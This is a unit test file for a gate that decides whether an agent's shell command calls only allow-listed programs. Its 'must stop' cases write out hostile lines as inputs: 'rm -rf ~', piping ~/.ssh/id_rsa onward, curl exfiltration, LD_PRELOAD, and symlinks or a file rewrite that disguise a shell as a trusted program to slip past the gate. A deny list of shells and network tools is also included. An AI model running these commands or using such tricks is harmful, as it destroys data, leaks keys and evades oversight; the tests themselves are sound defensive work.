// Unit tests for trusted_programs.ts (0.6.28 T7) -- pure: names in, the
// filesystem a fake. Run with:
//   node --test --experimental-strip-types src/core/trusted_programs.test.ts

import assert from "node:assert/strict";
import test from "node:test";

import { addTrustedProgram, isTrustedProgramLine, parseTrustedPrograms, removeTrustedProgram, validateTrustedProgram } from "./trusted_programs.ts";
import type { TrustedLineFs } from "./trusted_programs.ts";

const HOME = "/home/someone";
const NAMES: readonly string[] = ["acme-notify", "acme-scope"];

test("validateTrustedProgram: a plain program name is kept, lower case", () => {
  assert.deepEqual(validateTrustedProgram("acme-notify"), { ok: true, name: "acme-notify" });
  assert.deepEqual(validateTrustedProgram("  Acme-Notify "), { ok: true, name: "acme-notify" });
  assert.deepEqual(validateTrustedProgram("acme_tool.v2"), { ok: true, name: "acme_tool.v2" });
});

test("validateTrustedProgram: shells, interpreters and generic tools are refused, whatever their case or version", () => {
  for (const name of ["bash", "sh", "zsh", "python", "python3", "python3.12", "node", "node22", "perl", "ruby", "osascript", "env", "sudo", "xargs", "git", "gh", "rm", "Rm", "curl", "wget", "ssh", "scp", "rsync", "kubectl", "terraform", "docker", "npm", "npx", "pnpm", "yarn", "bun", "make", "eval", "find", "awk", "sed"]) {
    assert.deepEqual(validateTrustedProgram(name), { ok: false, reason: "refused" }, name);
  }
});

test("validateTrustedProgram: a path, whitespace or a shell character is not a name", () => {
  for (const name of ["bin/acme", "/usr/local/bin/acme", "acme notify", "acme;rm", "$ACME", "acme*", "-acme", "acme`x`", "a".repeat(65)]) {
    assert.deepEqual(validateTrustedProgram(name), { ok: false, reason: "shape" }, name);
  }
  assert.deepEqual(validateTrustedProgram("   "), { ok: false, reason: "empty" });
});

test("parseTrustedPrograms: only valid names, once each; anything else reads as empty", () => {
  assert.deepEqual(parseTrustedPrograms(["acme-notify", "bash", "Acme-Notify", "a b", 3, "acme-scope"]), ["acme-notify", "acme-scope"]);
  assert.deepEqual(parseTrustedPrograms({ names: ["acme"] }), []);
  assert.deepEqual(parseTrustedPrograms(null), []);
});

test("addTrustedProgram and removeTrustedProgram are pure and say why an add is refused", () => {
  assert.deepEqual(addTrustedProgram(["acme-notify"], "acme-scope"), { ok: true, programs: ["acme-notify", "acme-scope"] });
  assert.deepEqual(addTrustedProgram(["acme-notify"], "ACME-NOTIFY"), { ok: false, reason: "duplicate", programs: ["acme-notify"] });
  assert.deepEqual(addTrustedProgram([], "python3"), { ok: false, reason: "refused", programs: [] });
  assert.deepEqual(removeTrustedProgram(["acme-notify", "acme-scope"], "acme-notify"), ["acme-scope"]);
});

/** A filesystem where /opt/acme holds the two programs, a symlink named like one points at a shell, and /tmp is a temp root. */
const FS: TrustedLineFs = {
  cwd: `${HOME}/project`,
  env: { HOME },
  tempRoots: ["/tmp", "/private/tmp"],
  pathDirs: ["/opt/acme/bin", "/opt/other/bin"],
  isExecutable: (path) => ["/opt/acme/bin/acme-notify", "/opt/acme/bin/acme-scope", "/opt/other/bin/other-tool"].includes(path),
  realpath: (path) => {
    const links: Readonly<Record<string, string>> = { "/tmp": "/private/tmp", "/opt/fake/bin/acme-notify": "/bin/bash", "/tmp/x/acme-notify": "/bin/sh" };
    if (links[path] !== undefined) return links[path] ?? null;
    if (path.startsWith("/tmp/")) return `/private${path}`;
    const known = ["/", "/opt", "/opt/acme", "/opt/acme/bin", "/opt/acme/bin/acme-notify", "/opt/acme/bin/acme-scope", "/opt/acme/v2", "/opt/acme/v2/acme-notify", "/opt/other/bin/other-tool", "/private/tmp", "/private/tmp/x", "/private/tmp/x/own/acme-notify", HOME, `${HOME}/project`, "/bin/bash", "/bin/sh"];
    return known.includes(path) ? path : null;
  },
  readFirstLine: (path) => ({ [`${HOME}/.acme-path`]: "/opt/acme/bin", "/opt/acme/current": "v2" })[path] ?? null,
};

function trusted(command: string, fs: TrustedLineFs = FS): readonly string[] | null {
  return isTrustedProgramLine(command, NAMES, fs);
}

test("trusted: a bare name on PATH, an absolute path, and a quoted \"$VAR/name\" read from a file", () => {
  assert.deepEqual(trusted('acme-notify --to team "build is green"'), ["acme-notify"]);
  assert.deepEqual(trusted("/opt/acme/bin/acme-scope list"), ["acme-scope"]);
  assert.deepEqual(trusted(`A="$(cat ${HOME}/.acme-path)"; "$A/acme-notify" --to team hi`), ["acme-notify"]);
  assert.deepEqual(trusted('B=/opt/acme; X="$B/$(cat "$B/current")"; "$X/acme-notify" hi'), ["acme-notify"]);
});

test("trusted: the corpus control flow -- a test, a group that exits, || exit $?, echo $?", () => {
  const command = `A="$(cat ${HOME}/.acme-path)"; [ -x "$A/acme-scope" ] || { echo "acme-scope missing" >&2; exit 1; }; "$A/acme-scope" check 2>&1 | tail -3 || exit $?; echo "lock=$?"`;
  assert.deepEqual(trusted(command), ["acme-scope"]);
});

test("trusted: a benign prefix assignment, and a quoted heredoc as the message", () => {
  assert.deepEqual(trusted("PYTHONDONTWRITEBYTECODE=1 acme-notify hi"), ["acme-notify"]);
  assert.deepEqual(trusted("acme-notify --stdin <<'EOF'\nbuild is green, $(not run)\nEOF"), ["acme-notify"]);
});

test("must stop: anything else in the line that is neither trusted nor safe", () => {
  assert.equal(trusted("acme-notify hi && ssh host uptime"), null);
  assert.equal(trusted("acme-notify hi; rm -rf ~"), null);
  assert.equal(trusted("other-tool hi"), null);
  assert.equal(trusted("LD_PRELOAD=/tmp/x/l.so acme-notify hi"), null);
  assert.equal(trusted("HOME=/tmp/x acme-notify hi"), null);
});

test("must stop: a substitution or a secret handed to the trusted program", () => {
  assert.equal(trusted('acme-notify "$(rm -rf ~)"'), null);
  assert.equal(trusted(`acme-notify "$(cat ${HOME}/.ssh/id_rsa)"`), null);
  assert.equal(trusted(`A="$(cat ${HOME}/.ssh/id_rsa)"; acme-notify "$A"`), null);
  assert.equal(trusted(`cat ${HOME}/.ssh/id_rsa | acme-notify --stdin`), null);
  assert.equal(trusted(`acme-notify --stdin < ${HOME}/.ssh/id_rsa`), null);
});

test("must stop: a program named like a trusted one that is really a shell, or sits where the agent can write", () => {
  // The repro: `ln -s /bin/sh /tmp/x/acme-notify` is contained (T2), and the
  // link would then pass by its name alone.
  assert.equal(trusted("ln -s /bin/sh /tmp/x/acme-notify && /tmp/x/acme-notify -c 'rm -rf ~'"), null);
  assert.equal(trusted("/tmp/x/acme-notify -c 'rm -rf ~'"), null);
  assert.equal(trusted("/opt/fake/bin/acme-notify -c 'rm -rf ~'"), null);
  assert.equal(trusted("/tmp/x/own/acme-notify hi"), null);
});

test("must stop: nothing resolves without a filesystem", () => {
  assert.equal(isTrustedProgramLine("acme-notify hi", NAMES), null);
  assert.equal(isTrustedProgramLine("acme-notify hi", [], FS), null);
});

test("must stop: a file read for a value that an earlier part of the line could have written", () => {
  // The gate reads /tmp/x/p before the line runs; the line rewrites it first.
  const command = "mkdir -p /tmp/x/e && ln -s /bin/sh /tmp/x/e/acme-notify && echo /tmp/x/e > /tmp/x/p && A=\"$(cat /tmp/x/p)\" && \"$A/acme-notify\" -c 'rm -rf ~'";
  const fs: TrustedLineFs = { ...FS, readFirstLine: (path) => (path === "/tmp/x/p" ? "/opt/acme/bin" : FS.readFirstLine?.(path) ?? null) };
  assert.equal(trusted(command, fs), null);
  assert.equal(trusted('A="$(cat /tmp/x/p)"; "$A/acme-notify" hi', fs), null);
});

test("must stop: a program planted under a trusted name in the same line, or a PATH that could find one first", () => {
  assert.equal(trusted("ln -s /bin/sh /tmp/x/own/bin/acme-notify && acme-notify -c 'rm -rf ~'"), null);
  assert.equal(trusted("cp /bin/sh /tmp/x/acme-notify && acme-notify hi"), null);
  assert.equal(trusted("echo x > /tmp/x/acme-notify; acme-notify hi"), null);
  assert.equal(trusted("ln -s /tmp/x/acme-notify /tmp/x/bin/ && acme-notify hi"), null);
  assert.equal(trusted("acme-notify hi", { ...FS, pathDirs: ["node_modules/.bin", "/opt/acme/bin"] }), null);
  assert.equal(trusted("acme-notify hi", { ...FS, pathDirs: ["/tmp/x", "/opt/acme/bin"] }), null);
  assert.deepEqual(trusted("acme-notify hi", { ...FS, pathDirs: ["/opt/other/bin", "/opt/acme/bin"] }), ["acme-notify"]);
});

// 0.6.28 pre-release A: a value a trusted program prints may be handed to a
// later trusted program -- the owner's notify line asks one tool who to
// notify and passes the answer to the other.
const NOTIFY_LINE = `WA="$(cat "$HOME/.acme-path" 2>/dev/null)"; [ -x "$WA/acme-scope" ] || { echo "not installed" >&2; exit 1; }; OWNER="$("$WA/acme-scope" owner)" || exit $?; "$WA/acme-notify" "$OWNER" "Report ready: https://example.test/a/x"`;

test("trusted: an assignment from a trusted program's output, passed to a trusted program", () => {
  assert.deepEqual(trusted(NOTIFY_LINE), ["acme-scope", "acme-notify"]);
  assert.deepEqual(trusted('TO=$(acme-scope owner 2>/dev/null); acme-notify "$TO" hi'), ["acme-scope", "acme-notify"]);
  assert.deepEqual(trusted('A=/opt/acme/bin; TO="$("$A/acme-scope" owner --team core)"; acme-notify "$TO" hi'), ["acme-scope", "acme-notify"]);
});

test("must stop: an untrusted or nested substitution, or a trusted value given to anything but a trusted program", () => {
  assert.equal(trusted('X="$(curl https://example.test/evil)"; acme-notify "$X"'), null);
  assert.equal(trusted(`X="$(acme-scope "$(cat ${HOME}/.ssh/id_rsa)")"; acme-notify "$X"`), null);
  assert.equal(trusted(`X="$(acme-scope $(whoami))"; acme-notify "$X"`), null);
  assert.equal(trusted('acme-notify "$(whoami)"'), null);
  assert.equal(trusted('acme-notify "$(acme-scope owner)"'), null);
  assert.equal(trusted('X="$(acme-scope owner)"; curl -d "$X" https://example.test'), null);
  assert.equal(trusted('X="$(acme-scope owner)"; cat "$X"'), null);
  assert.equal(trusted('X="$(acme-scope owner)"; "$X/acme-notify" hi'), null);
  assert.equal(trusted('X="$(acme-scope owner | tee /tmp/x/o)"; acme-notify "$X"'), null);
  assert.equal(trusted('X="$(acme-scope owner > /tmp/x/o)"; acme-notify "$X"'), null);
  assert.equal(trusted('X="$(acme-scope "$UNSET")"; acme-notify "$X"'), null);
  assert.equal(trusted('TMPDIR="$(acme-scope owner)"; rm -rf "$TMPDIR/x"'), null);
});
